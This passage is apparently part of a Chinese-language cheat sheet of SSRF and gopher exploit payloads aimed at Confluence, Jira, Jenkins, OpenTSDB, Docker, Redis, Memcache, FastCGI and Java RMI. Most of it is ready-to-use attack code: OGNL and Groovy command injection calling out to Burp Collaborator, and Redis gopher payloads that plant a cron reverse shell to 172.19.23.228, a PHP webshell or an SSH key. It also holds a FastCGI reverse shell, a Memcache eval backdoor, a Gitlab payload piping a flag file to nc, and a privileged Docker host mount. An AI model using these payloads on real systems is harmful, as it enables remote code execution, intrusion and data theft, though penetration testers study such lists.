/pages/templates2/viewpagetemplate.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
/template/custom/content-editor?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
/templates/editor-preload-container?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
/users/user-dark-features?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
```

共享链接(2016年11月及更早版本)
```
/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
```

CVE-2017-9506
```
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```

### Jira

常用绑定端口 80 443 8080 8443

CVE-2017-9506
```
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```

CVE-2019-8451
```
/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
```

### 其它Atlassian产品

常用绑定端口 80 443 8080 8443

CVE-2017-9506

+ Bamboo < 6.0.0 </br>
+ Bitbucket < 4.14.4</br>
+ Crowd < 2.11.2</br>
+ Crucible < 4.3.2</br>
+ Fisheye < 4.3.2</br>

```
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```

### OpenTSDB

常用绑定端口 4242

curl RCE
```
/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
```

CVE-2020-35476
```
/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
```

### Jenkins

常用绑定端口 80 443 8080 8888

CVE-2018-1000600

```
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=orange&password=tsai
```

RCE
```
/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
```

Groovy RCE
```
cmd = 'curl burp_collab'
pay = 'public class x {public x(){"%s".execute()}}' % cmd
data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + urllib.quote(pay)
```

### Hystrix Dashboard

常用绑定端口 80 443 8080

CVE-2020-5412
```
/proxy.stream?origin=http://SSRF_CANARY/
```

### W3 Total Cache

常用绑定端口 80 443

CVE-2019-6715
```http
PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36
Content-Length: 124
Content-Type: application/x-www-form-urlencoded
Connection: close

{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://SSRF_CANARY"}
```

此PHP代码将为SSRF Canary主机生成有效负载，替换URL为控制主机:
```php
<?php

$url='http://www.google.com';
$file=strtr(base64_encode(gzdeflate($url.'#https://ajax.googleapis.com')), '+/=', '-_');
$file=chop($file,'=');
$req='/wp-content/plugins/w3-total-cache/pub/minify.php?file='.$file.'.css';
echo($req);

?>
```

### Docker

常用绑定端口 2375 2376

验证Docker的API是否存在
```
/containers/json
/secrets
/services
```

通过运行任意Docker镜像进行RCE
```http
POST /containers/create?name=test HTTP/1.1
Host: website.com
Content-Type: application/json
...

{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}
```

### Gitlab Prometheus Redis Exporter

常用绑定端口 9121

该漏洞印象13.1.1之前版本的Gitlab实例，以下端点允许攻击者转储通过目标参数提供的Redis服务器中的所有密钥
```
http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
```

## Gopher

### Redis

常用绑定端口 6379

Cron RCE
```bash
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save
```

Gopher
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

通过shell上传进行RCE
```python
#!/usr/bin/env python
# -*-coding:utf-8-*-

import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
shell="\n\n<?php phpinfo();?>\n\n"
filename="shell.php"
path="/var"
passwd=""

cmd=["flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print payload
```

通过authorized_keys进行RCE
```python
import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
# shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
sshpublic_key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8IOnJUAt5b/5jDwBDYJTDULjzaqBe2KW3KhqlaY58XveKQRBLrG3ZV0ffPnIW5SLdueunb4HoFKDQ/KPXFzyvVjqByj5688THkq1RJkYxGlgFNgMoPN151zpZ+eCBdFZEf/m8yIb3/7Cp+31s6Q/DvIFif6IjmVRfWXhnkjNehYjsp4gIEBiiW/jWId5yrO9+AwAX4xSabbxuUyu02AQz8wp+h8DZS9itA9m7FyJw8gCrKLEnM7PK/ClEBevDPSR+0YvvYtnUxeCosqp9VrjTfo5q0nNg9JAvPMs+EA1ohUct9UyXbTehr1Bdv4IXx9+7Vhf4/qwle8HKali3feIZ root@kali\n\n"
filename="authorized_keys"
path="/root/.ssh/"
passwd=""
cmd=["flushall",
     "set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print payload
```

通过Git协议对Gitlab进行RCE
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```

### Memcache

常用绑定端口 11211

```
gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a
```

### Apache Tomcat

常用绑定端口 80 443 8080 8443

仅对Tomcat6有效

[Gopher-Tomcat-deployer](https://github.com/pimps/gopher-tomcat-deployer)

### Fast CGI

常用绑定端口 80 443

```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
```

### Java RMI

常用绑定端口 1090 1098 1099 1199 4443 4444 4445 4446 8999-9010 9999

```bash
$ rmg serial 127.0.0.1 1090 CommonsCollections6 'curl example.burpcollaborator.net' --component reg --ssrf --gopher
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI Registry endpoint...
[+]
[+] 	SSRF Payload: gopher://127.0.0.1:1090/_%4a%52%4d%49%00%02%4c%50%ac%ed%00%05%77%22%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%02%44%15%4d[...]
```
